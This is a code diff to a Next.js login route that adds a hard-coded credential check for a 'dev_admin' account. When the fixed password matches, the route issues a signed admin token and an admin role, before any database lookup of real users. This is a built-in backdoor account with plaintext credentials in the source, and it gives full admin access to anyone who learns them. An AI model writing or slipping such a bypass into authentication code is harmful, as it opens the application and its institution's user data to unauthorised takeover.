@@ -56,6 +56,16 @@ export async function POST(request: NextRequest) {
     }, { status: 200 });
   }
 
+  // Developer Admin Credential check
+  if (trimmedUsername === 'dev_admin' && password === 'dev_admin_secure_100') {
+    const token = signAdminToken('dev_admin');
+    return NextResponse.json({
+      token,
+      role: 'admin',
+      redirect: '/admin?tab=pri-tests&program=Developer'
+    }, { status: 200 });
+  }
+
   // 2. Check institution users (DB)
   try {
     await connectDB();
